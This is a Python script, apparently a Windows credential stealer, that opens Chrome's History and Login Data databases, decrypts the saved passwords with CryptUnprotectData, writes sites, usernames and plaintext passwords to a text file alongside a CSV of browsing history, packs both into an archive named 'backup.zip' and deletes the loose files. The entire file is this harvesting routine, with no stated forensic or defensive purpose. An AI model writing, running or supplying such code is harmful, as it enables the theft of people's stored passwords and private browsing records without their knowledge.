# -*- coding: utf-8 -*-
import win32crypt 
import sqlite3, os, csv, io
import zipfile
from datetime import datetime, timedelta

def getPath(desired):
    if "USERPROFILE" in os.environ:
        user_profile = os.getenv("USERPROFILE")
        app_local = "\\AppData\\Local"     
        path = user_profile+app_local+desired
    else:
        path = "None"

    return path

def getHistory(cur):
    data = cur.execute('select title, url, visit_count, last_visit_time from urls order by visit_count desc;')
    with io.open("history.csv", 'w', encoding='utf-8') as f:
        csv_writer = csv.writer(f)
        headers = ("Title", "URL", "Visit Count", "Date (GMT)")
        csv_writer.writerow(headers)
        csv_writer.writerows(data)

def getCreds(cur):
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
    login_data = cur.fetchall()

    creds = {}
    for url, user_name, pwd, in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
        creds[url] = (user_name, pwd[1])

    with open('it.txt', 'w') as f:
        for url, cred in creds.items():
            if cred[1]:
                f.write("\n"+str(url)+"\n"+str(cred[0].encode('utf-8'))+ " | "+str(cred[1])+"\n")
            else:
                f.write("\n"+url+"\n"+"USERNAME NOT FOUND | PASSWORD NOT FOUND \n")
 

def connectPath(path):
    con = sqlite3.connect(path)
    cur = con.cursor()
    return cur

def main():
   #History
   his = "history.csv"
   history_db = "\\Google\\Chrome\\User Data\\Default\\History" 
   path = getPath(history_db)
   cur = connectPath(path)
   getHistory(cur)
   #Creds
   it = "it.txt"
   login_db = "\\Google\\Chrome\\User Data\\Default\Login Data"
   path = getPath(login_db)
   cur = connectPath(path)
   getCreds(cur)
   with zipfile.ZipFile('backup.zip', 'w') as zf:  
       zf.write(it)
       zf.write(his)
   
   os.remove(it) 
   os.remove(his)

if __name__ == '__main__':
    main()
